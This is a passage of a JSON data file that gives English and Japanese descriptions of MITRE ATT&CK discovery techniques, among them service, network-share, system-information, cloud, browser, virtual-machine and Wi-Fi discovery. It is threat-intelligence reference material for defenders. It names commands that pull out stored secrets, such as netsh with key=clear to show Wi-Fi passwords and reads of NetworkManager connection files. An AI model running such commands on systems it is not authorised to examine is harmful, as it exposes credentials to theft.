                "description_eng": "Adversaries may attempt to enumerate local device drivers on a victim host. Information about device drivers may highlight various insights that shape follow-on behaviors, such as the function/purpose of the host, present security tools (i.e. [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)) or other defenses (e.g., [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)), as well as potential exploitable vulnerabilities (e.g., [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)).\n\nMany OS utilities may provide information about local device drivers, such as `driverquery.exe` and the `EnumDeviceDrivers()` API function on Windows.(Citation: Microsoft Driverquery)(Citation: Microsoft EnumDeviceDrivers) Information about device drivers (as well as associated services, i.e., [System Service Discovery](https://attack.mitre.org/techniques/T1007)) may also be available in the Registry.(Citation: Microsoft Registry Drivers)\n\nOn Linux/macOS, device drivers (in the form of kernel modules) may be visible within `/dev` or using utilities such as `lsmod` and `modinfo`.(Citation: Linux Kernel Programming)(Citation: lsmod man)(Citation: modinfo man)",
                "description_jp": "攻撃者は、被害者ホスト上のローカルデバイスドライバーを列挙しようとする可能性があります。デバイスドライバーに関する情報は、ホストの機能/目的、存在するセキュリティツール（つまり、[セキュリティソフトウェアの発見](https://attack.mitre.org/techniques/T1518/001)）またはその他の防御（例えば、[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)）、および潜在的な悪用可能な脆弱性（例えば、[権限昇格のための悪用](https://attack.mitre.org/techniques/T1068)）など、その後の行動を形成するさまざまな洞察を明らかにする可能性があります。\n\n多くのOSユーティリティは、Windows上の`driverquery.exe`や`EnumDeviceDrivers()` API関数など、ローカルデバイスドライバに関する情報を提供できます。(引用: Microsoft Driverquery)(引用: Microsoft EnumDeviceDrivers) デバイスドライバに関する情報（および関連サービス、つまり[システムサービスディスカバリ](https://attack.mitre.org/techniques/T1007)）は、レジストリでも利用できる場合があります。(引用: Microsoft Registry Drivers)\n\nLinux/macOSでは、デバイスドライバ（カーネルモジュールの形式）は`/dev`内、または`lsmod`や`modinfo`などのユーティリティを使用して表示される場合があります。(引用: Linux Kernel Programming)(引用: lsmod man)(引用: modinfo man)",
                "subtechniques": []
            },
            {
                "id": "T1007",
                "name_eng": "System Service Discovery",
                "name_jp": "システムサービスの探索",
                "description_eng": "Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as <code>sc query</code>, <code>tasklist /svc</code>, <code>systemctl --type=service</code>, and <code>net start</code>.\n\nAdversaries may use the information from [System Service Discovery](https://attack.mitre.org/techniques/T1007) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "description_jp": "攻撃者は、登録されているローカルシステムサービスに関する情報を収集しようとする可能性があります。攻撃者は、<code>sc query</code>、<code>tasklist /svc</code>、<code>systemctl --type=service</code>、<code>net start</code>などのOSユーティリティコマンドやツールを使用してサービスに関する情報を取得する可能性があります。\n\n攻撃者は、自動検出中に[システムサービスディスカバリ](https://attack.mitre.org/techniques/T1007)からの情報を使用して、攻撃者がターゲットを完全に感染させるかどうか、および/または特定のアクションを試みるかどうかなど、その後の行動を形成する可能性があります。",
                "subtechniques": []
            },
            {
                "id": "T1040",
                "name_eng": "Network Sniffing",
                "name_jp": "ネットワークスニッフィング",
                "description_eng": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
                "description_jp": "攻撃者は、ネットワーク経由で渡される認証マテリアルを含む、環境に関する情報をキャプチャするために、ネットワークトラフィックを受動的にスニッフィングする可能性があります。ネットワークスニッフィングとは、システム上のネットワークインターフェイスを使用して、有線または無線接続を介して送信される情報を監視またはキャプチャすることを指します。攻撃者は、ネットワークインターフェイスを無差別モードにしてネットワーク経由で送信中のデータに受動的にアクセスしたり、SPANポートを使用してより大量のデータをキャプチャしたりする可能性があります。\n\nこのテクニックでキャプチャされたデータには、ユーザー資格情報、特に安全でない暗号化されていないプロトコルで送信されたものが含まれる場合があります。[LLMNR/NBT-NSポイズニングとSMBリレー](https://attack.mitre.org/techniques/T1557/001)などの名前サービス解決ポイズニングのテクニックも、トラフィックを攻撃者にリダイレクトすることにより、ウェブサイト、プロキシ、および内部システムの資格情報をキャプチャするために使用できます。\n\nネットワークスニッフィングは、実行中のサービス、バージョン番号、およびその後の[ラテラルムーブメント](https://attack.mitre.org/tactics/TA0008)および/または[防御回避](https://attack.mitre.org/tactics/TA0005)アクティビティに必要なその他のネットワーク特性（IPアドレス、ホスト名、VLAN IDなど）などの構成の詳細を明らかにする可能性があります。攻撃者はまた、[中間者攻撃](https://attack.mitre.org/techniques/T1557)（AiTM）中にネットワークスニッフィングを利用して、環境に関する追加の知識を受動的に得る可能性があります。\n\nクラウドベースの環境では、攻撃者は依然としてトラフィックミラーリングサービスを使用して仮想マシンからネットワークトラフィックをスニッフィングできる可能性があります。例えば、AWS Traffic Mirroring、GCP Packet Mirroring、Azure vTapにより、ユーザーはトラフィックを収集する特定のインスタンスと、収集されたトラフィックを送信する特定のターゲットを定義できます。(引用: AWS Traffic Mirroring)(引用: GCP Packet Mirroring)(引用: Azure Virtual Network TAP) 多くの場合、このトラフィックの多くは、トラフィックの暗号化と復号化の負担を軽減するためにロードバランサーレベルでTLS終端を使用するため、平文になります。(引用: Rhino Security Labs AWS VPC Traffic Mirroring)(引用: SpecterOps AWS Traffic Mirroring) その後、攻撃者は、スニッフィングされたトラフィックにアクセスするために、クラウドアカウントへのデータ転送などの持ち出しテクニックを使用できます。(引用: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nネットワークデバイスでは、攻撃者は<code>monitor capture</code>などの[ネットワークデバイスCLI](https://attack.mitre.org/techniques/T1059/008)コマンドを使用してネットワークキャプチャを実行する可能性があります。(引用: US-CERT-TA18-106A)(引用: capture_embedded_packet_on_software)",
                "subtechniques": []
            },
            {
                "id": "T1135",
                "name_eng": "Network Share Discovery",
                "name_jp": "ネットワーク共有の探索",
                "description_eng": "Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \n\nFile sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia Shared Resource) (Citation: TechNet Shared Folder) [Net](https://attack.mitre.org/software/S0039) can be used to query a remote system for available shared drives using the <code>net view \\\\\\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>. For macOS, the <code>sharing -l</code> command lists all shared points used for smb services.",
                "description_jp": "攻撃者は、収集の前段階として収集する情報源を特定したり、横方向の移動に関心のある潜在的なシステムを特定したりする手段として、リモートシステムで共有されているフォルダやドライブを探す可能性があります。ネットワークには、ユーザーがネットワーク全体のさまざまなシステム上のファイルディレクトリにアクセスできるようにする共有ネットワークドライブやフォルダが含まれていることがよくあります。\n\nWindowsネットワーク経由のファイル共有は、SMBプロトコル経由で行われます。(引用: Wikipedia Shared Resource)(引用: TechNet Shared Folder) [Net](https://attack.mitre.org/software/S0039)を使用して、<code>net view \\\\\\\\remotesystem</code>コマンドでリモートシステム上の利用可能な共有ドライブを照会できます。また、<code>net share</code>を使用してローカルシステム上の共有ドライブを照会することもできます。macOSの場合、<code>sharing -l</code>コマンドはsmbサービスに使用されるすべての共有ポイントを一覧表示します。",
                "subtechniques": []
            },
            {
                "id": "T1120",
                "name_eng": "Peripheral Device Discovery",
                "name_jp": "周辺機器の探索",
                "description_eng": "Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system.(Citation: Peripheral Discovery Linux)(Citation: Peripheral Discovery macOS) Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.",
                "description_jp": "攻撃者は、コンピュータシステムに接続されている接続済み周辺機器およびコンポーネントに関する情報を収集しようとする可能性があります。(引用: Peripheral Discovery Linux)(引用: Peripheral Discovery macOS) 周辺機器には、キーボード、プリンタ、カメラ、スマートカードリーダー、リムーバブルストレージなど、さまざまな機能をサポートする補助リソースが含まれる場合があります。この情報は、システムおよびネットワーク環境の認識を高めるために使用されたり、さらなるアクションのために使用されたりする可能性があります。",
                "subtechniques": []
            },
            {
                "id": "T1082",
                "name_eng": "System Information Discovery",
                "name_jp": "システム情報の探索",
                "description_eng": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather detailed system information (e.g. <code>show version</code>).(Citation: US-CERT-TA18-106A) On ESXi servers, threat actors may gather system information from various esxcli utilities, such as `system hostname get`, `system version get`, and `storage filesystem list` (to list storage volumes).(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(Citation: Varonis)\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)\n\n[System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools and Techniques)",
                "description_jp": "攻撃者は、バージョン、パッチ、ホットフィックス、サービスパック、アーキテクチャなど、オペレーティングシステムとハードウェアに関する詳細情報を取得しようとする可能性があります。攻撃者は、自動検出中に[システム情報ディスカバリ](https://attack.mitre.org/techniques/T1082)からの情報を使用して、攻撃者がターゲットを完全に感染させるかどうか、および/または特定のアクションを試みるかどうかなど、その後の行動を形成する可能性があります。\n\n[Systeminfo](https://attack.mitre.org/software/S0096)などのツールを使用して、詳細なシステム情報を収集できます。特権アクセスで実行している場合、macOSの<code>systemsetup</code>構成ツールを介してシステムデータの詳細を取得できます。ユーザーレベルのアクセス権を持つ攻撃者は、<code>df -aH</code>コマンドを実行して、現在マウントされているディスクと関連する空き領域を取得できます。攻撃者はまた、ネットワークデバイス上の[ネットワークデバイスCLI](https://attack.mitre.org/techniques/T1059/008)を利用して、詳細なシステム情報を収集する（例：<code>show version</code>）可能性があります。(引用: US-CERT-TA18-106A) ESXiサーバーでは、脅威アクターは<code>system hostname get</code>、<code>system version get</code>、<code>storage filesystem list</code>（ストレージボリュームを一覧表示するため）など、さまざまなesxcliユーティリティからシステム情報を収集する可能性があります。(引用: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(引用: Varonis)\n\nAWS、GCP、AzureなどのInfrastructure as a Service（IaaS）クラウドプロバイダーは、APIを介してインスタンスおよび仮想マシン情報へのアクセスを許可します。認証されたAPI呼び出しが成功すると、特定のインスタンスのオペレーティングシステムプラットフォームやステータス、または仮想マシンのモデルビューなどのデータが返される可能性があります。(引用: Amazon Describe Instance)(引用: Google Instances Resource)(引用: Microsoft Virutal Machine API)\n\n[システム情報ディスカバリ](https://attack.mitre.org/techniques/T1082)と、他の形式のディスカバリおよび偵察から収集された情報を組み合わせることで、ペイロードの開発と隠蔽を促進できます。(引用: OSX.FairyTale)(引用: 20 macOS Common Tools and Techniques)",
                "subtechniques": []
            },
            {
                "id": "T1010",
                "name_eng": "Application Window Discovery",
                "name_jp": "アプリケーションウィンドウの探索",
                "description_eng": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used.(Citation: Prevailion DarkWatchman 2021) For example, information about application windows could be used identify potential data to collect as well as identifying security tooling ([Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)) to evade.(Citation: ESET Grandoreiro April 2020)\n\nAdversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) commands and [Native API](https://attack.mitre.org/techniques/T1106) functions.",
                "description_jp": "攻撃者は、開いているアプリケーションウィンドウのリストを取得しようとする可能性があります。ウィンドウリストは、システムの利用方法に関する情報を伝える可能性があります。(引用: Prevailion DarkWatchman 2021) 例えば、アプリケーションウィンドウに関する情報は、収集する潜在的なデータを特定したり、回避するセキュリティツール（[セキュリティソフトウェアの発見](https://attack.mitre.org/techniques/T1518/001)）を特定したりするために使用される可能性があります。(引用: ESET Grandoreiro April 2020)\n\n敵対者は通常、この種の列挙のためにシステム機能を利用します。例えば、[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)コマンドや[ネイティブAPI](https://attack.mitre.org/techniques/T1106)関数などのネイティブシステム機能を介して情報を収集する場合があります。",
                "subtechniques": []
            },
            {
                "id": "T1580",
                "name_eng": "Cloud Infrastructure Discovery",
                "name_jp": "クラウドインフラストラクチャの探索",
                "description_eng": "An adversary may attempt to discover infrastructure and resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services.\n\nCloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides a <code>DescribeInstances</code> API within the Amazon EC2 API that can return information about one or more instances within an account, the <code>ListBuckets</code> API that returns a list of all buckets owned by the authenticated sender of the request, the <code>HeadBucket</code> API to determine a bucket’s existence along with access permissions of the request sender, or the <code>GetPublicAccessBlock</code> API to retrieve access block configuration for a bucket.(Citation: Amazon Describe Instance)(Citation: Amazon Describe Instances API)(Citation: AWS Get Public Access Block)(Citation: AWS Head Bucket) Similarly, GCP's Cloud SDK CLI provides the <code>gcloud compute instances list</code> command to list all Google Compute Engine instances in a project (Citation: Google Compute Instances), and Azure's CLI command <code>az vm list</code> lists details of virtual machines.(Citation: Microsoft AZ CLI) In addition to API commands, adversaries can utilize open source tools to discover cloud storage infrastructure through [Wordlist Scanning](https://attack.mitre.org/techniques/T1595/003).(Citation: Malwarebytes OSINT Leaky Buckets - Hioureas)\n\nAn adversary may enumerate resources using a compromised user's access keys to determine which are available to that user.(Citation: Expel IO Evil in AWS) The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence.(Citation: Mandiant M-Trends 2020)An adversary may also use this information to change the configuration to make the bucket publicly accessible, allowing data to be accessed without authentication. Adversaries have also may use infrastructure discovery APIs such as <code>DescribeDBInstances</code> to determine size, owner, permissions, and network ACLs of database resources. (Citation: AWS Describe DB Instances) Adversaries can use this information to determine the potential value of databases and discover the requirements to access them. Unlike in [Cloud Service Discovery](https://attack.mitre.org/techniques/T1526), this technique focuses on the discovery of components of the provided services rather than the services themselves.",
                "description_jp": "攻撃者は、Infrastructure-as-a-Service（IaaS）環境内で利用可能なインフラストラクチャとリソースを発見しようとする可能性があります。これには、インスタンス、仮想マシン、スナップショットなどのコンピューティングサービスリソースや、ストレージおよびデータベースサービスを含む他のサービスのリソースが含まれます。\n\nクラウドプロバイダーは、APIやCLI経由で発行されるコマンドなど、インフラストラクチャに関する情報を提供する方法を提供しています。例えば、AWSはAmazon EC2 API内に<code>DescribeInstances</code> APIを提供しており、これによりアカウント内の1つ以上のインスタンスに関する情報、リクエストの認証済み送信者が所有するすべてのバケットのリストを返す<code>ListBuckets</code> API、バケットの存在とリクエスト送信者のアクセス権限を判断するための<code>HeadBucket</code> API、またはバケットのアクセスブロック構成を取得するための<code>GetPublicAccessBlock</code> APIを返すことができます。(引用: Amazon Describe Instance)(引用: Amazon Describe Instances API)(引用: AWS Get Public Access Block)(引用: AWS Head Bucket) 同様に、GCPのCloud SDK CLIは<code>gcloud compute instances list</code>コマンドを提供してプロジェクト内のすべてのGoogle Compute Engineインスタンスを一覧表示し(引用: Google Compute Instances)、AzureのCLIコマンド<code>az vm list</code>は仮想マシンの詳細を一覧表示します。(引用: Microsoft AZ CLI) APIコマンドに加えて、攻撃者は[ワードリストスキャン](https://attack.mitre.org/techniques/T1595/003)を介してクラウドストレージインフラストラクチャを発見するためにオープンソースツールを利用する可能性があります。(引用: Malwarebytes OSINT Leaky Buckets - Hioureas)\n\n攻撃者は、侵害されたユーザーのアクセスキーを使用してリソースを列挙し、そのユーザーが利用できるリソースを特定する可能性があります。(引用: Expel IO Evil in AWS) これらの利用可能なリソースの発見は、永続性の確立など、クラウド環境での次のステップを決定するのに役立つ可能性があります。(引用: Mandiant M-Trends 2020)攻撃者はまた、この情報を使用して構成を変更し、バケットをパブリックにアクセスできるようにし、認証なしでデータにアクセスできるようにする可能性もあります。攻撃者はまた、データベースリソースのサイズ、所有者、権限、ネットワークACLを特定するために、<code>DescribeDBInstances</code>などのインフラストラクチャ検出APIを使用しています。(引用: AWS Describe DB Instances) 攻撃者はこの情報を使用して、データベースの潜在的な価値を判断し、それらにアクセスするための要件を発見できます。[クラウドサービスディスカバリ](https://attack.mitre.org/techniques/T1526)とは異なり、このテクニックはサービス自体ではなく、提供されるサービスのコンポーネントの発見に焦点を当てています。",
                "subtechniques": []
            },
            {
                "id": "T1217",
                "name_eng": "Browser Information Discovery",
                "name_jp": "ブラウザ情報の探索",
                "description_eng": "Adversaries may enumerate information about browsers to learn more about compromised environments. Data saved by browsers (such as bookmarks, accounts, and browsing history) may reveal a variety of personal information about users (e.g., banking sites, relationships/interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.(Citation: Kaspersky Autofill)\n\nBrowser information may also highlight additional targets after an adversary has access to valid credentials, especially [Credentials In Files](https://attack.mitre.org/techniques/T1552/001) associated with logins cached by a browser.\n\nSpecific storage locations vary based on platform and/or application, but browser information is typically stored in local files and databases (e.g., `%APPDATA%/Google/Chrome`).(Citation: Chrome Roaming Profiles)",
                "description_jp": "攻撃者は、侵害された環境についてさらに学ぶためにブラウザに関する情報を列挙する可能性があります。ブラウザによって保存されたデータ（ブックマーク、アカウント、閲覧履歴など）は、ユーザーに関するさまざまな個人情報（銀行サイト、関係/興味、ソーシャルメディアなど）や、サーバー、ツール/ダッシュボード、またはその他の関連インフラストラクチャなどの内部ネットワークリソースに関する詳細を明らかにする可能性があります。(引用: Kaspersky Autofill)\n\nブラウザ情報はまた、攻撃者が有効な資格情報、特にブラウザによってキャッシュされたログインに関連する[ファイル内の資格情報](https://attack.mitre.org/techniques/T1552/001)へのアクセスを取得した後、追加のターゲットを浮き彫りにする可能性があります。\n\n特定のストレージ場所はプラットフォームやアプリケーションによって異なりますが、ブラウザ情報は通常、ローカルファイルやデータベース（例：`%APPDATA%/Google/Chrome`）に保存されます。(引用: Chrome Roaming Profiles)",
                "subtechniques": []
            },
            {
                "id": "T1673",
                "name_eng": "Virtual Machine Discovery",
                "name_jp": "仮想マシンの探索",
                "description_eng": "An adversary may attempt to enumerate running virtual machines (VMs) after gaining access to a host or hypervisor. For example, adversaries may enumerate a list of VMs on an ESXi hypervisor using a [Hypervisor CLI](https://attack.mitre.org/techniques/T1059/012) such as `esxcli` or `vim-cmd` (e.g. `esxcli vm process list or vim-cmd vmsvc/getallvms`).(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(Citation: TrendMicro Play) Adversaries may also directly leverage a graphical user interface, such as VMware vCenter, in order to view virtual machines on a host. \n\nAdversaries may use the information from [Virtual Machine Discovery](https://attack.mitre.org/techniques/T1673) during discovery to shape follow-on behaviors. Subsequently discovered VMs may be leveraged for follow-on activities such as [Service Stop](https://attack.mitre.org/techniques/T1489) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)",
                "description_jp": "攻撃者は、ホストまたはハイパーバイザーへのアクセスを取得した後、実行中の仮想マシン（VM）を列挙しようとする可能性があります。例えば、攻撃者は<code>esxcli</code>や<code>vim-cmd</code>（例：<code>esxcli vm process list</code>または<code>vim-cmd vmsvc/getallvms</code>）などの[ハイパーバイザーCLI](https://attack.mitre.org/techniques/T1059/012)を使用してESXiハイパーバイザー上のVMのリストを列挙する可能性があります。(引用: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(引用: TrendMicro Play) 攻撃者はまた、VMware vCenterなどのグラフィカルユーザーインターフェイスを直接利用して、ホスト上の仮想マシンを表示する可能性もあります。\n\n攻撃者は、[仮想マシンディスカバリ](https://attack.mitre.org/techniques/T1673)からの情報をディスカバリ中に使用して、その後の行動を形成する可能性があります。その後発見されたVMは、[サービス停止](https://attack.mitre.org/techniques/T1489)や[影響のためのデータ暗号化](https://attack.mitre.org/techniques/T1486)などの追跡活動に利用される可能性があります。(引用: Crowdstrike Hypervisor Jackpotting Pt 2 2021)",
                "subtechniques": []
            },
            {
                "id": "T1016",
                "name_eng": "System Network Configuration Discovery",
                "name_jp": "システムネットワーク構成の探索",
                "description_eng": "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).(Citation: US-CERT-TA18-106A)(Citation: Mandiant APT41 Global Intrusion ) On ESXi, adversaries may leverage esxcli to gather network configuration information. For example, the command `esxcli network nic list` will retrieve the MAC address, while `esxcli network ip interface ipv4 get` will retrieve the local IPv4 address.(Citation: Trellix Rnasomhouse 2024)\n\nAdversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.",
                "description_jp": "攻撃者は、アクセスしたシステムのIPアドレスやMACアドレスなどのネットワーク構成と設定に関する詳細、またはリモートシステムの情報の発見を通じて情報を探す可能性があります。この情報を収集するために使用できるオペレーティングシステムの管理ユーティリティがいくつか存在します。例としては、[Arp](https://attack.mitre.org/software/S0099)、[ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101)、[nbtstat](https://attack.mitre.org/software/S0102)、[route](https://attack.mitre.org/software/S0103)などがあります。\n\n敵対者はまた、ネットワークデバイス上の[ネットワークデバイスCLI](https://attack.mitre.org/techniques/T1059/008)を利用して、構成済みインターフェイスのIPアドレスや静的/動的ルートなどの構成や設定に関する情報を収集する（例：<code>show ip route</code>、<code>show ip interface</code>）。(引用: US-CERT-TA18-106A)(引用: Mandiant APT41 Global Intrusion ) ESXiでは、敵対者はesxcliを利用してネットワーク構成情報を収集する。例えば、コマンド<code>esxcli network nic list</code>はMACアドレスを取得し、<code>esxcli network ip interface ipv4 get</code>はローカルIPv4アドレスを取得する。(引用：Trellix Rnasomhouse 2024）\n\n攻撃者は、自動検出中に[システムネットワーク構成ディスカバリ](https://attack.mitre.org/techniques/T1016)からの情報を使用して、ターゲットネットワーク内の特定のアクセスや次に実行するアクションの決定など、その後の行動を形成する可能性があります。",
                "subtechniques": [
                    {
                        "id": "T1016.002",
                        "name_eng": "Wi-Fi Discovery",
                        "name_jp": "Wi-Fi探索",
                        "description_eng": "Adversaries may search for information about Wi-Fi networks, such as network names and passwords, on compromised systems. Adversaries may use Wi-Fi information as part of [Account Discovery](https://attack.mitre.org/techniques/T1087), [Remote System Discovery](https://attack.mitre.org/techniques/T1018), and other discovery or [Credential Access](https://attack.mitre.org/tactics/TA0006) activity to support both ongoing and future campaigns.\n\nAdversaries may collect various types of information about Wi-Fi networks from hosts. For example, on Windows names and passwords of all Wi-Fi networks a device has previously connected to may be available through `netsh wlan show profiles` to enumerate Wi-Fi names and then `netsh wlan show profile “Wi-Fi name” key=clear` to show a Wi-Fi network’s corresponding password.(Citation: BleepingComputer Agent Tesla steal wifi passwords)(Citation: Malware Bytes New AgentTesla variant steals WiFi credentials)(Citation: Check Point APT35 CharmPower January 2022) Additionally, names and other details of locally reachable Wi-Fi networks can be discovered using calls to `wlanAPI.dll` [Native API](https://attack.mitre.org/techniques/T1106) functions.(Citation: Binary Defense Emotes Wi-Fi Spreader)\n\nOn Linux, names and passwords of all Wi-Fi-networks a device has previously connected to may be available in files under ` /etc/NetworkManager/system-connections/`.(Citation: Wi-Fi Password of All Connected Networks in Windows/Linux) On macOS, the password of a known Wi-Fi may be identified with ` security find-generic-password -wa wifiname` (requires admin username/password).(Citation: Find Wi-Fi Password on Mac)",
                        "description_jp": "攻撃者は、侵害されたシステム上のネットワーク名やパスワードなどのWi-Fiネットワークに関する情報を検索する可能性があります。攻撃者は、進行中および将来のキャンペーンをサポートするために、[アカウントディスカバリ](https://attack.mitre.org/techniques/T1087)、[リモートシステムディスカバリ](https://attack.mitre.org/techniques/T1018)、およびその他のディスカバリまたは[認証情報アクセス](https://attack.mitre.org/tactics/TA0006)アクティビティの一環としてWi-Fi情報を使用する可能性があります。\n\n敵対者はホストからWi-Fiネットワークに関する様々な種類の情報を収集するかもしれない。例えば、Windowsでは、デバイスが以前に接続したすべてのWi-Fiネットワークの名前とパスワードは、<code>netsh wlan show profiles</code>でWi-Fi名を列挙し、その後<code>netsh wlan show profile “Wi-Fi name” key=clear</code>でWi-Fiネットワークの対応するパスワードを表示することで利用可能になるかもしれない。(引用：BleepingComputer Agent Tesla steal wifi passwords)(引用：Malware Bytes New AgentTesla variant steals WiFi credentials)(引用：Check Point APT35 CharmPower January 2022) さらに、ローカルで到達可能なWi-Fiネットワークの名前やその他の詳細は、<code>wlanAPI.dll</code> [ネイティブAPI](https://attack.mitre.org/techniques/T1106)関数への呼び出しを使用して発見できる。(引用：Binary Defense Emotes Wi-Fi Spreader)\n\nLinuxでは、デバイスが以前に接続したすべてのWi-Fiネットワークの名前とパスワードは、<code>/etc/NetworkManager/system-connections/</code>以下のファイルで利用できる場合があります。(引用: Wi-Fi Password of All Connected Networks in Windows/Linux) macOSでは、既知のWi-Fiのパスワードは<code>security find-generic-password -wa wifiname</code>で識別できます（管理者ユーザー名/パスワードが必要）。(引用: Find Wi-Fi Password on Mac)"
                    },
                    {
                        "id": "T1016.001",
                        "name_eng": "Internet Connection Discovery",
                        "name_jp": "インターネット接続の探索",
                        "description_eng": "Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using [Ping](https://attack.mitre.org/software/S0097), <code>tracert</code>, and GET requests to websites.\n\nAdversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.",
                        "description_jp": "攻撃者は、侵害されたシステムでインターネット接続を確認する可能性があります。これは自動検出中に実行される可能性があり、[Ping](https://attack.mitre.org/software/S0097)、<code>tracert</code>、WebサイトへのGETリクエストなど、さまざまな方法で実行できます。\n\n攻撃者は、これらのリクエストからの結果と応答を使用して、C2サーバーへの接続を試みる前にシステムがC2サーバーと通信できるかどうかを判断する場合があります。結果は、ルート、リダイレクタ、プロキシサーバーを特定するためにも使用される場合があります。"
                    }
                ]
            },
            {
                "id": "T1087",
                "name_eng": "Account Discovery",
                "name_jp": "アカウントの探索",
                "description_eng": "Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., [Valid Accounts](https://attack.mitre.org/techniques/T1078)).\n\nAdversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.\n\nFor examples, cloud environments typically provide easily accessible interfaces to obtain user lists.(Citation: AWS List Users)(Citation: Google Cloud - IAM Servie Accounts List API) On hosts, adversaries can use default [PowerShell](https://attack.mitre.org/techniques/T1059/001) and other command line functionality to identify accounts. Information about email 